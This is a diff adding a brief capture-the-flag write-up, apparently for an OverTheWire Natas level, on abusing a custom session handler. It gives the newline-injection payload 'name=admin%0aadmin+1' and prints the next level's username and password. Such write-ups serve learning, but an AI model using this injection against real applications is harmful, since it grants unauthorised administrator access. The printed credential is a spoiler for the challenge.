@@ -1,0 +1,11 @@
+=>this uses user defined functions to for session handling
+->looking closely the myread() function looks for \n character
+  to differetiate the two session variables.
+  so we can inject 0x0a and add "admin 1"
+  like this : admin%0aadmin+1 (on the request)
+
+name=admin%0aadmin+1
+
+You are an admin. The credentials for the next level are:
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
